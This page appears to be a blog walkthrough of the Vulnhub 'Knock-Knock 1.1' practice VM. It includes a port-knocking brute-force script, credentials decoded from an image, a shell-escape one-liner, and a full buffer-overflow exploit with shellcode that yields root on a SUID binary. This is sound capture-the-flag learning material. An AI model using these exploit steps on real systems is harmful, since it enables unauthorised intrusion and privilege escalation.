@@ -1,0 +1,511 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>[Vulnhub]Knock-Knock: 1.1  | F4l13n5n0w</title>
+
+<meta name="author" content="F4l13n5n0w"> 
+
+<meta name="description" content="This is a description"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="F4l13n5n0w" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">F4l13n5n0w</a></h1>
+<h4>Info Security & Pen Testing learning notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">段子 | Blogging</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">玩意儿 | Coding</a></li>
+	<li><a href="/archives">藏♥品 | Reading</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">段子 | Blogging</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">玩意儿 | Coding</a></li>
+	<li><a href="/archives">藏♥品 | Reading</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:f4l13n5n0w.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">[Vulnhub]Knock-Knock: 1.1</h2>
+	<div class="entry-content"><p>&ldquo;Pretty much thought of a pretty neat idea I hadn&rsquo;t seen done before with a VM, and I wanted to turn it into reality!
+Your job is to escalate to root, and find the flag.
+Since I&rsquo;ve gotten a few PM&rsquo;s, remember: There is a difference between "Port Unreachable&rdquo; and &ldquo;Host Unreachable&rdquo;. DHCP is not broken ;)
+Gotta give a huge shoutout to c0ne for helping to creating the binary challenge, and rasta_mouse and recrudesce for testing :)
+Also, gotta thank barrebas who was able to find a way to make things easier&hellip; but of course that is fixed with this update! ;)&ldquo; &ndash; <font color="green"><em>zer0w1re</em></font></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/knock-knock-11,105/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>
+
+<p>Target: TopHatSec: Freshly (<em>10.10.10.140/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>Port knocking brute-force to open the hidden ports</li>
+<li>Secret information hidden in picture</li>
+<li>Buffer Overflow analysis and exploit</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
+<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
+<li>Analysis and write script to brute force port knocking</li>
+<li>Port scanned again to dicover the real open ports [<font color="FF8000">nmap</font>]</li>
+<li>Web application vulnerability scanned to discover any web vulnerability [<font color="FF8000">nikto</font>]</li>
+<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
+<li>Download picture and reveal the hidden information</li>
+<li>Crack the cipher text to get login creditional in plain text [<font color="FF8000">Caesar shift with ROT 13</font>]</li>
+<li>Login SSH with cracked login creditional</li>
+<li>Look around and found suspicious program with SUID bit set</li>
+<li>Analysis and work out PoC to exploit BoF vulnerability in the target program to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.140 in this case).</p>
+
+<p><img class="left" src="/downloads/knock-knock/1.png"></p>
+
+<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, only TCP port 1337 has been discovered running on Ubuntu Linux.
+<code>nmap -v -sV -A -O -T4 -p- 10.10.10.140</code></p>
+
+<p><img class="left" src="/downloads/knock-knock/2.png"></p>
+
+<h3>Port knocking</h3>
+
+<p>In order to understand what Port Knocking is and how it works, I found the following 2 links: <a href="http://www.portknocking.org/">link_1</a>, <a href="https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu">link_2</a>.</p>
+
+<p>Basically, I need to send SYN request to several random ports (3 in this case) in correct orders and valid time period, then the firewall or proxy will change the rules to open hidden ports.</p>
+
+<p><img class="left" src="/downloads/knock-knock/3.png"></p>
+
+<p>Due to there are 3 ports and total 6 possible orders for the sequence, I wrote a script to try all the possibilities.</p>
+
+<figure class='code'><figcaption><span>knock.py  (knock.py)</span> <a href='/downloads/code/knock.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">permutations</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;10.10.10.140&quot;</span>            <span class="c">#target IP</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">Knockports</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">try</span><span class="p">:</span>
+</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[*] Knocking on port: &quot;</span><span class="p">,</span> <span class="n">port</span>
+</span><span class='line'>          <span class="n">s2</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>          <span class="n">s2</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>           <span class="c"># set timeout in 0.1s</span>
+</span><span class='line'>          <span class="n">s2</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span><span class='line'>          <span class="n">s2</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>      <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[-] </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">e</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>              <span class="c">#connect to port 1337 to grab three random ports</span>
+</span><span class='line'>  <span class="n">r</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>  
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;received: &quot;</span><span class="p">,</span> <span class="n">r</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span> <span class="n">comb</span> <span class="ow">in</span> <span class="n">permutations</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>      <span class="c"># try all the possibility of 3-ports orders </span>
+</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">[*] Trying sequence </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">Knockports</span><span class="p">(</span><span class="n">comb</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[*] Done&quot;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">main</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="left" src="/downloads/knock-knock/4.png"></p>
+
+<p>After run the script, use nmap to check open services.</p>
+
+<p><img class="left" src="/downloads/knock-knock/5.png"></p>
+
+<p>Now two more ports discovered: <code>22</code> and <code>80</code>.</p>
+
+<p>Next I run nikto scan on port 80 and Dirbuster to guess hidden paths as standard procedure but nothing found, only the knock knock picture. So I downloaded the picture and use command <code>strings</code> to check if there is anything hidden in the the picture.</p>
+
+<p><img class="left" src="/downloads/knock-knock/6.png"></p>
+
+<p>Bingo! Very juicy information found in the end:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Login Credentials
+</span><span class='line'>abfnW
+</span><span class='line'>sax2Cw90w</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After tried several different encryption methods, I found this is encrypted by <a href="https://en.wikipedia.org/wiki/Caesar_cipher">Caesar cipher</a> with ROT-13. There is an useful online <a href="http://www.xarg.org/tools/caesar-cipher/">Caesarian cipher decryption tool</a> which allow me to decrypt cipher text in different ROT number to detect the correct ROT number.</p>
+
+<p>After decrypted:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>abfnW       -     nosaJ
+</span><span class='line'>sax2Cw9Ow   -     fnk2Pj9Bj</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They are actually backwards, so the Login Credential is</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>username: Jason
+</span><span class='line'>password: jB9jP2knf</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now I can SSH login to the target (I tried &lsquo;Jason&rsquo; first but failed, when I tried all lower case &lsquo;jason&rsquo;, it works)</p>
+
+<p><img class="left" src="/downloads/knock-knock/7.png"></p>
+
+<h3>Shell Escape</h3>
+
+<p>Due to the current shell is Restricted, I use python <code>python -c "import pty; pty.spawn('/bin/bash')"</code> to escape.</p>
+
+<p><img class="left" src="/downloads/knock-knock/8.png"></p>
+
+<p>By poking around, I found a binary program &lsquo;tfc&rsquo; with SUID bit set which normally can help us to get ROOT.</p>
+
+<p><img class="left" src="/downloads/knock-knock/9.png"></p>
+
+<p>This is a file encryption program, first argument is the input file (plain text) and the second argument is the output file (cipher text), both of the input and output have to be <code>.tfc</code> extension.</p>
+
+<p><img class="left" src="/downloads/knock-knock/10.png"></p>
+
+<p>As we can see above, reverse the input file and output file, it will decrypt the cipher text.</p>
+
+<p>Now let&rsquo;s try a large file to see if it has Buffer Overflow vulnerability.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jason@knockknock:~$ python -c "print 'A'*5000" > in.tfc
+</span><span class='line'>jason@knockknock:~$ ./tfc in.tfc out.tfc
+</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Segmentation fault!! sounds like it has BoF. Then I use <a href="link:%20http://www.trapkit.de/tools/checksec.html">searchsec.sh</a> to check what protections are enabled on it.</p>
+
+<p><img class="left" src="/downloads/knock-knock/11.png"></p>
+
+<p>Cool, there is no any protection at all!</p>
+
+<p>Due to gdb is not installed on the target machine, I have to download the tfc program to my Kali for further analyzing.</p>
+
+<p><img class="left" src="/downloads/knock-knock/12.png"></p>
+
+<p>Why here is <code>0x0675c916</code> but not expected <code>0x41414141</code>? After playing around and further analysis, this should be encrypted of <code>0x41414141</code>. So I need the payload encrypted first. Thanks to <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>. He provided a method to get encrypted data from core dump file. This method will save lots of time and works to reverse engineering the <code>tfc</code> program for re-writing the encryption script.</p>
+
+<p>Next, I need to find where is the offset to just change the EIP. After tried several varying lengths and checking the value of return address in gdb. I finally found the offset to overwrite the return address (4124 bytes).</p>
+
+<p>Due to 4 &lsquo;A&rsquo;s always starts with same bytes 'def0 5bab&rsquo; in encrypted file, So &lsquo;def0 5bab&rsquo; can be used as a pattern to locate encrypted data in core dump file.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c 'print "A" * 100' > in.tfc
+</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc
+</span><span class='line'>>> File crypted, goodbye!
+</span><span class='line'>root@kali:~# xxd out.tfc | head
+</span><span class='line'>0000000: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python -c 'print "A" * 5000' > in.tfc
+</span><span class='line'>root@kali:~# ./tfc in.tfc out.tfc 
+</span><span class='line'>Segmentation fault (core dumped)
+</span><span class='line'>root@kali:~# xxd core | grep 'def0 5bab'
+</span><span class='line'>0030700: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, use <code>msfelfscan</code> to get jmp esp address.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# msfelfscan -j esp tfc 
+</span><span class='line'>[tfc]
+</span><span class='line'>0x08048e93 jmp esp
+</span><span class='line'>0x08048e93 jmp esp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then use msf with payload (<font color="red"><em>linux/x86/exec</em></font>) to generate shellcode</p>
+
+<p><img class="left" src="/downloads/knock-knock/13.png"></p>
+
+<p><code>-b</code> switch will blacklist special characters.</p>
+
+<p>Then I wrote a python script to output payload with shellcode.</p>
+
+<figure class='code'><figcaption><span>payload.py  (payload.py)</span> <a href='/downloads/code/payload.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xb8\x87\x10\x54\x8e\xd9\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x0b\x31\x46\x15\x83\xc6\x04\x03\x46\x11\xe2\x72\x7a\x5f\xd6\xe5\x29\x39\x8e\x38\xad\x4c\xa9\x2a\x1e\x3c\x5e\xaa\x08\xed\xfc\xc3\xa6\x78\xe3\x41\xdf\x73\xe4\x65\x1f\xab\x86\x0c\x71\x9c\x35\xa6\x8d\xb5\xea\xbf\x6f\xf4\x8d</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">content</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">4124</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span>               <span class="c"># 0x08048e93 jmp esp</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">20</span>                       <span class="c"># padding 20 NOPs to protect shellcode</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="n">shellcode</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="s">&#39;C&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5000</span> <span class="o">-</span> <span class="mi">4124</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span><span class="mi">20</span> <span class="o">-</span><span class="mi">70</span><span class="p">)</span>  <span class="c"># padding with &#39;C&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">content</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, use <code>tfc</code> program to encrypt the payload and dump the encrypted data from core dump</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# python payload.py > in.tfc
+</span><span class='line'>root@kali:~/Knock# ./tfc in.tfc out.tfc
+</span><span class='line'>Segmentation fault (core dumped)
+</span><span class='line'>root@kali:~/Knock# xxd /tmp/core-tfc-11-0-0-18419-1434802506 | grep 'def0 5bab'
+</span><span class='line'>0034340: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then use <code>dd</code> to carve out the encrypted data, byte by byte, skipping the first 213824 bytes (0034340 in HEX) and count is the length of exploit payload (5000 bytes)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# dd if=/tmp/core-tfc-11-0-0-18419-1434802506 of=exp.tfc skip=213824 count=5000 bs=1
+</span><span class='line'>5000+0 records in
+</span><span class='line'>5000+0 records out
+</span><span class='line'>5000 bytes (5.0 kB) copied, 0.0723968 s, 69.1 kB/s</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now try to exploit &lsquo;tfc&rsquo; program with the encrypted exploit payload (exp.tfc):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Knock# ./tfc exp.tfc pwn.tfc
+</span><span class='line'># id
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
+</span><span class='line'># exit</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool, it works on my Kali!</p>
+
+<p>Now, upload <code>exp.tfc</code> to target machine and exploit <code>tfc</code> to get ROOT!</p>
+
+<p><img class="left" src="/downloads/knock-knock/14.png"></p>
+
+<p>Done :)</p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+2015-06-21 04:49:54 -0400</div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/bof/'>bof</a>, <a class='category' href='/blog/categories/knock-knock/'>knock-knock</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2015
+
+    F4l13n5n0w
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
